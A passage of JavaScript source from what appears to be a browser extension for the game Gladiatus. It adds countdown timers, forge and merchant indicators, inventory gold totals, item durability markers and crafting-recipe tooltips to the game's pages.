					// Create timer
					this.crapsTimeElement = document.createElement("font");
					this.crapsTimeElement.id = "CrapsTime";
					this.crapsTimeElement.style = "margin-left:5px;font-weight:bold;";
					this.crapsTimeElement.textContent = "(N/A)";
					link.appendChild(this.crapsTimeElement);

					// Time difference
					this.timer = (nextAvailable - gca_tools.time.server());
					// Check if the time has finished
					if(this.timer < 0){
						// Zero toss but new day
						if(this.craps_free_toss == 0 && gca_data.section.get("timers", 'craps_last_date', 0) != gca_tools.time.serverDateString()){
							this.crapsTimeElement.textContent = "(" + gca_locale.get("global", "quest_new") + ")";
						}
						// Do i have data saved?
						else if(this.craps_free_toss >= 0){
							this.crapsTimeElement.textContent = "(" + this.craps_free_toss + ")";
						}
					}
					// Time has NOT finished
					else {
						// Refresh the countdown
						this.countdown_started = new Date().getTime();
						this.countdown_interval = setInterval(() => {
							this.countdown();
						}, 500);
						this.countdown();
					}
				},

				// Count Down
				countdown_started : null,
				countdown_interval : null,
				countdown : function(){
					var timer = this.timer - (new Date().getTime() - this.countdown_started);
					// If ready
					if(timer < 0){
						if (this.craps_free_toss == 0 && gca_data.section.get("timers", 'craps_last_date', 0) == gca_tools.time.serverDateString()) {
							this.crapsTimeElement.textContent = "(" + gca_locale.get("global", "quest_new") + ")";
						}
						else{
							this.crapsTimeElement.textContent = "(" + this.craps_free_toss + ")";
						}
						// Clear timer
						clearInterval(this.countdown_interval);
						return;
					}

					// Convert milliseconds to Minutes:Seconds
					var date = new Date(timer);
					var minutes = date.getMinutes();
					var seconds = date.getSeconds();
					// Format to 01:04
					if(minutes < 10){minutes = '0'+minutes;}
					if(seconds < 10){seconds = '0'+seconds;}

					// Display the values
					this.crapsTimeElement.textContent = '(' + minutes + ':' + seconds + ')';
				},

				reset : function() {
					// Clear any interval
					if (this.countdown_interval) clearInterval(this.countdown_interval);
					// Remove elements
					if (this.crapsTimeElement) {
						this.crapsTimeElement.parentNode.removeChild(this.crapsTimeElement);
						this.crapsTimeElement = null;
					}
					// Re-create
					this.display();
				}
			},


			// Server Quest Event Timer
			server_quest_timer : {
				inject : function(){
					// Do not run while traveling
					if (gca_global.isTraveling) return;

					// if server quest or report page wait for update event
					if (gca_section.mod == 'reports' || gca_section.mod == 'location' && (gca_section.submod == 'serverQuest' || isNaN(gca_getPage.parameter('loc')))) {
						gca_tools.event.addListener("server_quest-info-update", () => {
							this.display();
						});
						return;
					}

					this.display();
				},

				// Display timers
				display : function(){
					// Already running
					if(this.serverQuestTimeElement)
						return;
					// Get banner
					var banner = document.getElementById("banner_event_link");
					if(!banner) return;
					// Check banner link
					var banner_link = gca_getPage.parameters(banner.href);
					if(banner_link.mod != "location" || (banner_link.submod != "serverQuest" && !isNaN(banner_link.loc))){
						return;
					}

					// Time when server quest is available
					var nextAvailable = parseInt(gca_data.section.get("timers", 'server_quest_available', 0), 10);
					// Server quest point
					this.points = gca_data.section.get("timers", 'server_quest_points','N/A');
					
					// Timer wrapper
					this.serverQuestWrapperElement = document.createElement("div");
					this.serverQuestWrapperElement.id = "ServerQuestTime";
					banner.parentNode.appendChild(this.serverQuestWrapperElement);

					// Icon
					let img = document.createElement("img");
					img.src = gca_tools.img.cdn("img/ui/expedition_points2.png");
					this.serverQuestWrapperElement.appendChild(img);
					this.serverQuestWrapperElement.appendChild(document.createTextNode(" "));

					// Points
					this.serverQuestPointsElement = document.createElement("span");
					this.serverQuestPointsElement.textContent = "";
					this.serverQuestWrapperElement.appendChild(this.serverQuestPointsElement);
					this.serverQuestWrapperElement.appendChild(document.createTextNode(" "));

					// Timer
					this.serverQuestTimeElement = document.createElement("span");
					this.serverQuestTimeElement.textContent = "";
					this.serverQuestWrapperElement.appendChild(this.serverQuestTimeElement);

					// Time difference
					this.timer = (nextAvailable - gca_tools.time.server());
					// Check if the time has finished
					if(this.timer < 0){
						// No points but new day
						if(this.points == 0 && gca_data.section.get("timers", 'server_quest_last_date', 0) != gca_tools.time.serverDateString()){
							this.serverQuestPointsElement.textContent = "?";
							this.serverQuestTimeElement.textContent = "";
						}
						// Do i have data saved?
						else if(this.points != 'N/A'){
							this.serverQuestPointsElement.textContent = this.points;
							this.serverQuestTimeElement.textContent = "";
						}
						// No data
						else{
							this.serverQuestPointsElement.textContent = "?";
							this.serverQuestTimeElement.textContent = "";
						}
					}
					// Time has NOT finished
					else {
						// Refresh the countdown
						this.countdown_started = new Date().getTime();
						this.countdown_interval = setInterval(() => {
							this.countdown();
						}, 500);
						this.countdown();
					}
				},

				// Count Down
				countdown_started : null,
				countdown_interval : null,
				countdown : function(){
					var timer = this.timer - (new Date().getTime() - this.countdown_started);
					// If ready
					if(timer < 0){
						if (this.points != 'N/A') {
							this.serverQuestPointsElement.textContent = this.points;
						} else {
							this.serverQuestPointsElement.textContent = "";
						}
						this.serverQuestTimeElement.textContent = "";
						// Clear timer
						clearInterval(this.countdown_interval);
						return;
					}

					// Convert milliseconds to Minutes:Seconds
					var date = new Date(timer);
					var minutes = date.getMinutes();
					var seconds = date.getSeconds();
					// Format to 01:04
					if(minutes < 10){minutes = '0'+minutes;}
					if(seconds < 10){seconds = '0'+seconds;}

					// Display the values
					this.serverQuestTimeElement.textContent = '- ' + minutes + ':' + seconds + '';
				}
			}
		},

		forge_timer : function(){
			var smeltTimes = gca_data.section.get("timers", "smelt_times", {data:[]});
			var forgeTimes = gca_data.section.get("timers", "forge_times", {data:[]});
			
			if(smeltTimes.data.length>0 || forgeTimes.data.length>0){
				// Create indicator
				var forge = gca_global.display.advanced_main_menu.info.sublink.forge.link;
				var forge_active = (forge.className.match('active')) ? '_active' : '';
				
				var type = 'red';
				// PC time NOT SERVER time (for some unknown reason :P gladiatus gives this time in code)
				var current = new Date(); current = current.getTime();
				var tooltip = '[[';
				if(smeltTimes.data.length>0){
					tooltip += '[["'+smeltTimes.translation[0]+'","'+smeltTimes.translation[1]+'"],["#FFF; text-shadow: 0 0 2px #000, 0 0 2px #FFF","#FFF; text-shadow: 0 0 2px #000, 0 0 2px #FFF"]]';
					for(let i=0;i<smeltTimes.data.length;i++){
						if(smeltTimes.data[i][0]*1000<=current){
							type = 'green';
							gca_notifications.success( smeltTimes.translation[0]+': '+smeltTimes.data[i][1]+'\n'+smeltTimes.translation[2], gca_getPage.link({"mod":"forge","submod":"smeltery"}) );
							tooltip += ',[["'+smeltTimes.data[i][1]+'","'+smeltTimes.translation[2]+'"],["#DDD","#00ff00"]]';
						}else{
							let qualityColor = gca_tools.item.shadow.getColor(smeltTimes.data[i][2], true);
							if (qualityColor == false)
								qualityColor == 'white'; // compatibility with old data
							tooltip += ',[["'+smeltTimes.data[i][1]+'","'+gca_tools.time.msToString(smeltTimes.data[i][0]*1000-current)+`"],["${qualityColor}","white"]]`;
						}
					}
					if(forgeTimes.data.length>0){tooltip += ',';}
				}
				if(forgeTimes.data.length>0){
					tooltip += '[["'+forgeTimes.translation[0]+'","'+forgeTimes.translation[1]+'"],["#FFF; font-size:12px; text-shadow: 0 0 2px #000, 0 0 2px #FFF","#FFF; font-size:12px; text-shadow: 0 0 2px #000, 0 0 2px #FFF"]]';
					for(let i=0;i<forgeTimes.data.length;i++){
						if(forgeTimes.data[i][0]*1000<=current){
							type = 'green';
							gca_notifications.success(forgeTimes.translation[0]+': '+forgeTimes.data[i][1]+'\n'+forgeTimes.translation[2]);
							tooltip += ',[["'+forgeTimes.data[i][1]+'","'+forgeTimes.translation[2]+'"],["#DDD","#00ff00"]]';
						}else{
							let qualityColor = gca_tools.item.shadow.getColor(forgeTimes.data[i][2], true);
							if (qualityColor == false)
								qualityColor == 'white'; // compatibility with old data
							tooltip += ',[["'+forgeTimes.data[i][1]+'","'+gca_tools.time.msToString(forgeTimes.data[i][0]*1000-current)+`"],["${qualityColor}","white"]]`;
						}
					}
				}
				tooltip += ']]';
				
				// Add indicator
				this.icon = gca_global.display.advanced_main_menu.convertMenu.addSideIcon(forge, forge_active, "indicator-" + type);
				gca_tools.setTooltip(this.icon, tooltip);
			}
		},
		
		merchants_timer : {
			preload : function(){
				// Resolve menu
				this.self.display.advanced_main_menu.resolve();
				// Tag menu
				this.self.display.advanced_main_menu.tagMainMenu();
				
				// Clear indicator
				this.icon = null;
			},


			inject : function(self){
				// Save instances
				this.self = self;
				var that = this;

				// Preload
				this.preload();

				// if merchant wait for update event
				if(gca_section.mod == 'inventory'){
					this.setIndicator('grey', false);
					gca_tools.event.addListener("merchants-timer-update", function(){
						that.display();
					});
					return;
				}
				// Do not run while traveling
				else if (gca_global.isTraveling){
					return;
				}

				this.display();
			},

			setIndicator : function(type, tooltip) {
				// Create indicator
				if (!this.icon) {
					// Get menu item
					var weaponSmith = this.self.display.advanced_main_menu.info.sublink.weaponSmith.link;
					var weaponSmith_active = (weaponSmith.className.match('active')) ? '_active' : '';

					// Add indicator
					this.icon = this.self.display.advanced_main_menu.convertMenu.addSideIcon(weaponSmith, weaponSmith_active, "indicator-" + type);
				}
				// Update indicator
				else {
					this.icon.className = this.icon.className.replace(/indicator-\S+/g, "indicator-" + type);
				}

				if (tooltip) {
					gca_tools.setTooltip(this.icon, JSON.stringify(tooltip));
				}
			},

			// Display timers
			display : function(){
				// Time when new items will arrive
				var itemsRefresh = parseInt(gca_data.section.get("timers", 'merchants_refresh', 0), 10);
				this.text = gca_data.section.get("timers", 'merchants_refresh_text', " ");

				// Time difference
				this.timer = (itemsRefresh - gca_tools.time.server());

				// Check if the time has finished
				if(this.timer < 0){
					// New items arrived
					this.setIndicator('green', [[[this.text,"#BA9700"],["00:00:00","white;text-align:right;"]]]);
				}
				// Time has NOT finished
				else{
					// Save instance
					var that = this;
					// Refresh the countdown
					this.countdown_interval = setInterval(function(){
						that.countdown();
					}, 1000);
					this.countdown();
				}
			},

			// Count Down
			countdown_interval : null,
			countdown : function(){
				// If ready
				if(this.timer < 0){
					// New items arrived
					this.setIndicator('red', [[[this.text,"#BA9700"],["00:00:00","white;text-align:right;"]]]);

					// Clear timer
					clearInterval(this.countdown_interval);
					return;
				}
				
				// Wait items arrived
				this.setIndicator('red', [[[this.text,"#BA9700"],[gca_tools.time.msToString(this.timer),"white;text-align:right;"]]]);
				
				// 1 sec passed
				this.timer = this.timer - 1000;
			}
		},

		// X-Scroll enable
		xScrollFix : function(){
			document.documentElement.className += " gca_enable_xscroll";
		},

		// Group inventory options
		inventoryOptionsGroup : {
			// Preload before page load
			preload : function(){
				// Insert it on html tag
				document.documentElement.className += " inventory_options_group";
			},
			// Create group
			create : function(){
				if (!document.getElementById('inv')) return;

				// Get wrapper
				var wrapper = document.getElementById('inv').parentNode;
				// Create options button
				this.button = document.createElement('a');
				this.button.className = "gca-inv-group-options-button";
				var that = this;
				this.button.addEventListener('click', function(){
					that.toggle();
				}, false);
				wrapper.appendChild(this.button);
				// Create options box
				this.box = document.createElement('div');
				this.box.className = "gca-inv-group-options-box";
				wrapper.appendChild(this.box);
				
				var item;
				// Populate options box
				item = wrapper.getElementsByClassName("bag_buy_extend")[0];
				item.style.display = "block";
				this.box.appendChild(item);
				item = document.getElementById("itemOptions");
				item.style.display = "block";
				this.box.appendChild(item);
				item = document.getElementById("show-item-info");
				item.style.display = "block";
				this.box.appendChild(item);

				// Fix bug click
				var buy = wrapper.getElementsByClassName("bag_buy_extend")[0].getElementsByTagName("a")[0];
				buy.removeAttribute("href");
				buy.style.cursor = "pointer";
			},
			// Show/Hide options
			hidden : true,
			toggle : function() {
				if (this.hidden) this.show();
				else this.hide();
			},
			show : function() {
				this.box.style.display = "block";
				this.hidden = false;
			},
			hide : function() {
				this.box.style.display = "none";
				this.hidden = true;
			}
		},

		// Show inventory info
		inventoryInfo : {
			prepare : function () {
				// Exit if no inventory
				if(!document.getElementById("inv")) return;

				// Create UI
				this.infoBox = document.createElement("div");
				this.infoBox.className = "gca-bag-info";
				this.infoGold = document.createElement("span");
				this.infoBox.appendChild(this.infoGold);
				this.infoBox.appendChild(document.createTextNode(" "));
				this.infoBox.appendChild(gca_tools.create.goldIcon());
				document.getElementById("inv").parentNode.insertBefore(this.infoBox, document.getElementById("inv").nextSibling);

				// Add events
				gca_tools.event.bag.onBagOpen(() => {
					this.showInvInfo();
				});

				// If bag not already loaded
				if (document.getElementById("inv").className.match("unavailable")) {
					// Wait first bag
					gca_tools.event.bag.waitBag(() => {
						this.showInvInfo();
					});
				}
				// Else id already loaded
				else {
					// Add shadows
					this.showInvInfo();
				}

				// On item move
				gca_tools.event.request.onAjaxResponse((data) => {
					if (
						data.hasOwnProperty("data") && data.data &&
						data.data.hasOwnProperty("to") && data.data.to &&
						data.data.to.hasOwnProperty("data") && data.data.to.data &&
						data.elem.length === 1
					) {
						this.showInvInfo(data.elem[0]);
					}
				})
			},

			showInvInfo : function(item = {dataset:{amount:0,itemId:0,priceGold:0}}) {
				// Get items
				var items = document.getElementById('inv').getElementsByClassName("ui-draggable");
				// Count gold
				let gold = 0;

				// For each item
				for (var i = items.length - 1; i >= 0; i--) {
					let g = 0;
					// If item is the moved item
					if (item.dataset.itemId == items[i].dataset.itemId) {
						g = item.dataset.amount * item.dataset.priceGold;
					}
					// Normal items
					else {
						g = items[i].dataset.amount * items[i].dataset.priceGold;
					}
					if (!isNaN(g)) {
						gold += g;
					}
				}

				// Display
				this.infoGold.textContent = gca_tools.strings.insertDots(gold);
			}
		},

		// Load last auction state
		auctionLoadLastState : function() {
			let auction_gladiator = false;
			let auction_mercenary = false;
			let links, i;

			links = document.getElementById('submenu1').getElementsByClassName('menuitem');
			for (i = links.length - 1; i >= 0; i--) {
				if (links[i].href.match(/\?mod=auction&/)) {
					auction_gladiator = links[i];
					break;
				}
			}

			links = document.getElementById('submenu1').getElementsByClassName('advanced_menu_shift');
			for (i = links.length - 1; i >= 0; i--) {
				if (links[i].href.match(/\?mod=auction&/)) {
					auction_mercenary = links[i];
					break;
				}
			}

			// Update Auction links
			if (auction_gladiator)
				auction_gladiator.href = gca_getPage.link(gca_data.section.get('cache', 'auction_last_search_gladiator', {mod : 'auction'}));
			if (auction_mercenary)
				auction_mercenary.href = gca_getPage.link(gca_data.section.get('cache', 'auction_last_search_mercenary', {mod : 'auction', ttype : '3'}));
		},

		analyzeItems : {

			// Items Shadow enable
			itemShadow : {

				// Preload shadow
				preload : function(){
					document.documentElement.className += " do-item-shadow";
					// If dirty
					//if (gca_tools.easter_eggs.isDirty()) {
					//	document.documentElement.className += " do-item-dirty-shadow";
					//}
				},

				// Inject shadow into inventory
				inventory : function(){
					// Exit if no inventory
					if(!document.getElementById("inv")) return;

					// Add event
					gca_tools.event.bag.onBagOpen((tab) => {
						this.currentBag(tab);
					});

					// If bag not already loaded
					if (document.getElementById("inv").className.match("unavailable")) {
						// Wait first bag
						gca_tools.event.bag.waitBag(() => {
							this.currentBag(document.getElementById("inventory_nav").getElementsByClassName("current")[0]);
						});
					}
					// Else if already loaded
					// (you can test it with ctrl+F5)
					else {
						// Add shadows
						this.currentBag(document.getElementById("inventory_nav").getElementsByClassName("current")[0]);
					}
				},

				// Inject the current bag
				currentBag : function(tab){
					if(tab.dataset.itemShadowed) return;

					// Get items
					var items = document.getElementById('inv').getElementsByClassName("ui-draggable");
					
					// For each
					for (var i = items.length - 1; i >= 0; i--) {
						gca_tools.item.shadow.add(items[i]);
					}

					// Success
					if(items.length)
						tab.dataset.itemShadowed = true;
				},

				// Inject shadow into shop
				shop : function() {
					// Exit if no shop
					if(!document.getElementById("shop")) return;

					// Get items
					var items = document.getElementById('shop').getElementsByClassName("ui-draggable");
					
					// For each
					for (var i = items.length - 1; i >= 0; i--) {
						gca_tools.item.shadow.add(items[i]);
					}
				}
			},
			
			// Items durability enable
			itemDurability : {
				init : function(){
					// Show durability
					if (gca_options.get('global', 'show_durability') != 0)
						document.getElementById('content').className += ' show-item-durability';
					
					this.createDurability();
					
					// Exit if no inventory
					if(!document.getElementById("inv")) return;

					// Add event
					gca_tools.event.bag.onBagOpen(() => {
						this.createDurability(false);
					});

					// If bag not already loaded
					if (document.getElementById("inv").className.match("unavailable")) {
						// Wait first bag
						gca_tools.event.bag.waitBag(() => {
							this.createDurability(false);
						});
					}

					// If in packets
					if (gca_section.mod === "packages") {
						// On item get
						gca_tools.event.request.onAjaxResponse((response) => {
							// If package load request
							if(response.data.newPackages && response.data.pagination && response.data.worthTotal){
								this.createDurability(false);
							}
						});
						// On new packet page
						gca_tools.event.addListener("packages_page_loaded", () => {
							this.createDurability(false);
						});
					}
				},
				
				createDurability : function(notifications=true){
					// Get page Items
					var items = document.querySelectorAll('div[data-content-type]');
					var durability;
					var low_durability_items = [];
					let minimum_durability = notifications ? gca_options.get("global", "min_durability") : 0;
					let show_durability = gca_options.get('global', 'show_durability');
					// Loop page's Items
					for (let i = 0; i < items.length; i++){
						// If item
						if(!items[i].dataset.gca_durability && items[i].dataset.contentType.test(/^(1|2|4|8|48|256|512|1024)$/) && items[i].dataset.durability == null){
							items[i].dataset.gca_durability = true;
							// Get item's durability
							durability = items[i].dataset.tooltip.match(/\d+\\*\/\d+ \((\d+)%\)","([^"]+)"\],\["[^\/]+\/\d+ \((\d+)%\)/);
							// If item has durability
							if(durability){
								let durability_per_cent = durability[1];
								//let durability_color = durability[2]; //not used
								let conditioning = durability[3]; //=εξευγενισμός
								let total = (parseInt(durability_per_cent, 10) + parseInt(conditioning, 10));
								
								if (show_durability != 0){
									// If enabled: % or ●
									if(show_durability==1){
										items[i].dataset.durability = (conditioning > 0)? total + "%" : (durability_per_cent) + "%";
									}else{
										items[i].dataset.durability = '⚒';//●
									}
									// Colors
									if(conditioning > 0){
										items[i].dataset.durabilityColor = 1;
									}else if(durability_per_cent>=75){
										items[i].dataset.durabilityColor = 2;
									}else if(durability_per_cent>=50){
										items[i].dataset.durabilityColor = 3;
									}else if(durability_per_cent>=25){
										items[i].dataset.durabilityColor = 4;
									}else{
										items[i].dataset.durabilityColor = 5;
									}
								}
								
								// Notification (if you wear it)
								if(items[i].dataset.containerNumber <= 11 && total < minimum_durability){
									low_durability_items.push( {'name':JSON.parse('"'+items[i].dataset.tooltip.match(/"([^"]+)"/)[1]+'"'),'durability':total} );
								}
							}
						}
					}
					
					// Low durability notification
					if (low_durability_items.length>0){
						let items_string = ':';
						for(let i = 0; i < low_durability_items.length; i++){
							items_string += '\n● ' + low_durability_items[i].name + ' (' +low_durability_items[i].durability + '%)';
						}
						gca_notifications.error(
							'⚒ ' + gca_locale.get("global", "low_durability_items", {number:low_durability_items.length, percent:minimum_durability}) + items_string, gca_getPage.link({"mod":"forge","submod":"workbench"})
						);
					}
				}
			},

			itemForgeInfo : {
				init : function(){
					var style = gca_options.get("global", "show_forge_info");
					if (style == 1) this.style = 'minimal';
					else if (style == 2) this.style = 'extended';
					else if (style == 3) this.style = 'minimal-amounts';
					else if (style == 4) this.style = 'extended-amounts';
					else return;
					
					// Save server speed
					this.speed_factor = gca_tools.time.serverSpeed();

					var load = false;
					// If inventory exists
					if (document.getElementById('inv')) {
						load = true;
						// Add bag event
						gca_tools.event.bag.onBagOpen(() => {
							this.showInfo();
						});

						// If bag not already loaded
						if (document.getElementById('inv').className.match('unavailable')) {
							// Wait first bag
							gca_tools.event.bag.waitBag(() => {
								this.showInfo();
							});
						}
					}

					// If in packages
					if (gca_section.mod === 'packages') {
						load = true;
						// On item get
						gca_tools.event.request.onAjaxResponse((response) => {
							// If package load request
							if(response.data.newPackages && response.data.pagination && response.data.worthTotal){
								this.showInfo();
							}
						});
						// On new packet page
						gca_tools.event.addListener('packages_page_loaded', () => {
							this.showInfo();
						});
					}

					// If in auction
					else if (gca_section.mod === 'auction') {
						load = true;
					}

					if (load) {
						this.locale = gca_data.section.get('cache', 'resource_locale', false);
						this.showInfo();
					}

					// On item move
					gca_tools.event.request.onAjaxResponse((data) => {
						if (data?.data?.to?.data && data?.elem?.length === 1 && data?.elem[0]?.dataset?.hash) {
							let item = document.querySelector(`.ui-draggable[data-hash="${data.elem[0].dataset.hash}"]`);
							if (item){
								var tooltip = JSON.parse(item.dataset.tooltip);
								// Check if tooltip is modified
								if(tooltip[0][tooltip[0].length - 1][0].charAt(0)=='\uD83D'){
									// Refresh the tooltip
									gca_tools.setTooltip(item, JSON.stringify(tooltip));
								}else{
									delete item.dataset.forgeInfo;
									this.showItemInfo(item);
								}
							}
							//this.showInfo();
						}
					});
				},

				speed_factor : 1, // server speed
				enable_forge_time : true, // always true
				
				showInfo : function(){
					// Get page Items
					var items = document.querySelectorAll('div[data-content-type]');

					// Loop page's Items
					for (let i = 0; i < items.length; i++){
						if (items[i].dataset.hash) {
							this.showItemInfo(items[i]);
						}
					}
				},
				
				showItemInfo : function(item){
					if (item.dataset.forgeInfo) return;
					// Flag item
					item.dataset.forgeInfo = true;
					// Analyze hash
					let hash = item.dataset.hash.split('-');

					// Get type (sword, helmet ...)
					//let type = this.hashDecode(hash[1]);

					// Stats info
					let base = this.hashDecode(hash[1]) + '-' + this.hashDecode(hash[2]);
					let prefix = this.hashDecode(hash[5]);
					let suffix = this.hashDecode(hash[6]);

					// If not an craftable item
					if (!gca_data_recipes.isCraftable(base)) return;

					// Build forge info
					if (this.style === 'minimal' || this.style === 'extended') {
						this.tooltip(item, prefix, base, suffix);
					}
					else if (this.style === 'minimal-amounts' || this.style === 'extended-amounts') {
						//let Browser = typeof window.browser === 'undefined' ? window.chrome : window.browser;
						//Browser.runtime.sendMessage(window.gca_extension.id, {action: 'get-recipe', prefix: prefix, base: base, suffix : suffix}, (data) => {
						//	this.tooltip(item, prefix, base, suffix, data);
						//});
						gca_tools.extension.sendMessage({action: 'get-recipe', prefix: prefix, base: base, suffix : suffix}, (data) => {
							this.tooltip(item, prefix, base, suffix, data);
						});
					}
				},

				tooltip : function(item, prefix, base, suffix, recipe = false) {
					var info;
					if (this.style === 'extended') {
						info = this.style_extended(prefix, base, suffix);
					}
					else if (this.style === 'minimal') {
						info = this.style_normal(prefix, base, suffix, item); // developer mode available
					}
					else if (this.style === 'extended-amounts' && recipe) {
						info = this.style_extended_amounts(prefix, base, suffix, recipe);
					}
					else if (this.style === 'minimal-amounts' && recipe) {
						info = this.style_normal_amounts(prefix, base, suffix, recipe);
					}
					else return;

					// Add on tooltip
					var tooltip = JSON.parse(item.dataset.tooltip);
					for (let i = 0; i < info.length; i++) {
						tooltip[0].push(info[i]);
					}
					// Add forge time
					if(this.enable_forge_time){
						let gold = gca_tools.item.hash(item.dataset.hash).price_gold;
						let forge_time = gca_tools.time.msToHMS_String(gold * (2*0.9374) / this.speed_factor * 1000);
						tooltip[0].push([`🕑 ${forge_time}`, '#fff']);
					}

					gca_tools.setTooltip(item, JSON.stringify(tooltip));
				},

				getInfoRow : function(material, n = 0) {
					let img = '<div class="item-i-18-' + material + '" style="display:inline-block;transform: scale(0.7);margin:-12px 4px -12px -4px;"></div>';
					let name = (this.locale) ? ' ' + this.locale[material] + '' : '';
					let amount = n > 0 ? '<div style="display:inline-block;width:35px;">&times; ' + n + '</div>' : '';
					return [img + amount + name, '#cccccc'];
				},

				hashDecode : function(hash) {
					var key = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];
					var code = 0;
					for (var i = hash.length - 1; i >= 0; i--) {
						code += key.indexOf(hash[i]) * Math.pow(key.length, hash.length - i - 1);
					}
					return code;
				},

				style_normal : function(prefix, base, suffix, item) {
					// Switch for developers: show IDs and print unknown levels
					var developerMode = false;
					
					// Create rows for the tooltip
					var row_type = '<tr style="color: #ffffff;">';
					var row_info = '<tr style="color: #cccccc;">';
					var row_mats = '<tr style="height: 18px;color: #cccccc;">';
					var row_dev = '<tr>';

					var data = gca_data_recipes.getRecipe(prefix, base, suffix);
					
					// Try to calculate unknown levels
					if(item != null){
						// Check if needed / possible
						if( data.suffix.level*data.prefix.level < 0 ){
							var unknownLevel = item.dataset.level - ((prefix > 0) ? data.prefix.level : 0) - ((data.base) ? data.base.level : 0) - ((suffix > 0) ? data.suffix.level : 0) - 1; // -1 because the unknown would be -(-1)=1
							if(unknownLevel > 0){
								let logType = "Prefix "+prefix;
								if(data.prefix.level < 0)
									data.prefix.level = unknownLevel;
								else{
									data.suffix.level = unknownLevel;
									logType = "Suffix "+suffix;
								}
								
								if(developerMode){
									console.log( logType+" = "+unknownLevel+" lvl");
									alert( logType+" = "+unknownLevel+" lvl");
								}
							}
						}
					}

					// Prefix
					if (prefix > 0) {
						if (data.prefix) {
							let count = data.prefix.length;
							data.prefix.forEach((mat) => {
								row_mats += '<td><div class="item-i-18-' + mat + '" style="display:inline-block;transform: scale(0.7);margin:-12px -6px -12px -6px;"></div></td>';
							});
							row_type += '<td colspan="' + count + '">' + '[' + gca_locale.get("global", "prefix") + ']' + '</td>';
							row_info += '<td colspan="' + count + '">' + (data.prefix.level >= 0 ? data.prefix.level : '??') + ' lvl' + '</td>';
							row_dev += '<td colspan="' + count + '">' + '#' + prefix + '</td>';
						}
						else {
							row_type += '<td>' + '[' + gca_locale.get("global", "prefix") + ']' + '</td>';
							row_info += '<td>' + '?? lvl' + '</td>';
							row_dev += '<td>' + '#' + prefix + '</td>';
							row_mats += '<td>?</td>';
						}
					}

					// Base
					if (data.base) {
						let count = data.base.length;
						data.base.forEach((mat) => {
							row_mats += '<td><div class="item-i-18-' + mat + '" style="display:inline-block;transform: scale(0.7);margin:-12px -6px -12px -6px;"></div></td>';
						});
						row_type += '<td colspan="' + count + '">' + '[' + gca_locale.get("global", "base") + ']' + '</td>';
						row_info += '<td colspan="' + count + '">' + (data.base.level >= 0 ? data.base.level : '??') + ' lvl' + '</td>';
						row_dev += '<td colspan="' + count + '">' + '#' + base + '</td>';
					}
					else {
						row_type += '<td>' + '[' + gca_locale.get("global", "base") + ']' + '(?? lvl)' + base + '</td>';
						row_info += '<td>' + '?? lvl' + '</td>';
						row_dev += '<td>' + '#' + base + '</td>';
						row_mats += '<td>?</td>';
					}

					// Suffix
					if (suffix > 0) {
						if (data.suffix) {
							let count = data.suffix.length;
							data.suffix.forEach((mat) => {
								row_mats += '<td><div class="item-i-18-' + mat + '" style="display:inline-block;transform: scale(0.7);margin:-12px -6px -12px -6px;"></div></td>';
							});
							row_type += '<td colspan="' + count + '">' + '[' + gca_locale.get("global", "suffix") + ']' + '</td>';
							row_info += '<td colspan="' + count + '">' + (data.suffix.level >= 0 ? data.suffix.level : '??') + ' lvl' + '</td>';
							row_dev += '<td colspan="' + count + '">' + '#' + suffix + '</td>';
						}
						else {
							row_type += '<td>' + '[' + gca_locale.get("global", "suffix") + ']' + '</td>';
							row_info += '<td>' + '?? lvl' + '</td>';
							row_dev += '<td>' + '#' + suffix + '</td>';
							row_mats += '<td>?</td>';
						}
					}

					row_type += '</tr>';
					row_info += '</tr>';
					row_dev += '</tr>';
					row_mats += '</tr>';

					// Clear dev data
					if(!developerMode)
						row_dev = '';

					// Tooltip info list
					var info = [];
					// Separator
					info.push(['<div style="border-bottom:1px solid #555555"></div>', '#aaaaaa']);
					// Add table
					info.push(['<table style="color: #ffffff;font-size: 10px;border-spacing: 0px;width:100%;">' + row_type + row_mats + row_info + row_dev + '</table>', '#000000']);
					// Base margin
					info.push(['<div style="heigth:8px"></div>', '#000000']);

					return info;
				},

				style_normal_amounts : function(prefix, base, suffix, recipe) {
					let count = recipe.keys.length;
					// Create rows for the tooltip
					let row_type = '<tr style="color: #ffffff;"><td colspan="' + count + '">';
					row_type += (prefix > 0) ? '[' + gca_locale.get("global", "prefix") + ' ' + (recipe.lvls.prefix >= 0 ? recipe.lvls.prefix : '?') + ' lvl] ' + '' : '';
					row_type += '[' + gca_locale.get("global", "base") + ' ' + (recipe.lvls.base >= 0 ? recipe.lvls.base : '?') + ' lvl] ' + '';
					row_type += (suffix > 0) ? '[' + gca_locale.get("global", "suffix") + ' ' + (recipe.lvls.suffix >= 0 ? recipe.lvls.suffix : '?') + ' lvl] ' + '' : '';

					let row_mats = '<tr style="color: #cccccc;text-align:center;">';
					let row_icons = '<tr style="height: 18px;text-align:center;">';
					recipe.keys.forEach((i) => {
						row_mats += '<td>' + recipe.mats[i] + '&times;</td>';
						row_icons += '<td><div class="item-i-18-' + i + '" style="display:inline-block;transform: scale(0.7);margin:-12px -4px -12px -4px;"></div></td>';
					});

					row_type += '</tr>';
					row_mats += '</tr>';
					row_icons += '</tr>';

					// Tooltip info list
					let info = [];
					// Separator
					info.push(['<div style="border-bottom:1px solid #555555"></div>', '#aaaaaa']);
					// Add table
					info.push(['<table style="color: #ffffff;font-size: 10px;border-spacing: 0px;">' + row_type + row_mats + row_icons + '</table>', '#000000']);
					// Base margin
					info.push(['<div style="heigth:8px"></div>', '#000000']);

					return info;
				},

				style_extended : function(prefix, base, suffix) {
					// Tooltip info list
					var info = [];

					// Separator
					info.push(['<div style="border-bottom:1px solid #555555"></div>', '#aaaaaa']);

					//var data = this.data;
					var data = gca_data_recipes.getRecipe(prefix, base, suffix);
					
					// Prefix
					if (prefix > 0) {
						if (data.prefix) {
							info.push(['[' + gca_locale.get("global", "prefix") + '](' + (data.prefix.level >= 0 ? data.prefix.level : '?') + ' lvl)', '#ffffff']);
							data.prefix.forEach((mat) => {
								info.push(this.getInfoRow(mat));
							});
						}
						else {
							info.push(['[' + gca_locale.get("global", "prefix") + '](? lvl)', '#ffffff']);
							info.push(['?', '#cccccc']);
						}
					}

					// Base
					if (data.base) {
						info.push(['[' + gca_locale.get("global", "base") + '](' + (data.base.level >= 0 ? data.base.level : '?') + ' lvl)', '#ffffff']);
						data.base.forEach((mat) => {
							info.push(this.getInfoRow(mat));
						});
					}
					else {
						info.push(['[' + gca_locale.get("global", "base") + '](? lvl)', '#ffffff']);
						info.push(['?', '#cccccc']);
					}

					// Suffix
					if (suffix > 0) {
